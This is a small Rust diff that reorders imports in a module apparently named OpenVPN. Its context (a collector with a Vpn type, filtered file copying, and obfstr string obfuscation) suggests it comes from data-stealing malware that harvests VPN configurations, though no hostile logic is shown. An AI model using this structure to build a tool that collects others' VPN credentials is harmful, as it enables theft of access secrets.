@@ -2,9 +2,9 @@ use crate::alloc::borrow::ToOwned;
 use collector::{Collector, Vpn};
 use filesystem::path::Path;
 use filesystem::storage::StorageFileSystem;
-use filesystem::{copy_content_with_filter, FileSystem};
+use filesystem::{FileSystem, copy_content_with_filter};
 use obfstr::obfstr as s;
-use tasks::{parent_name, Task};
+use tasks::{Task, parent_name};
 
 pub(super) struct OpenVPN;
 
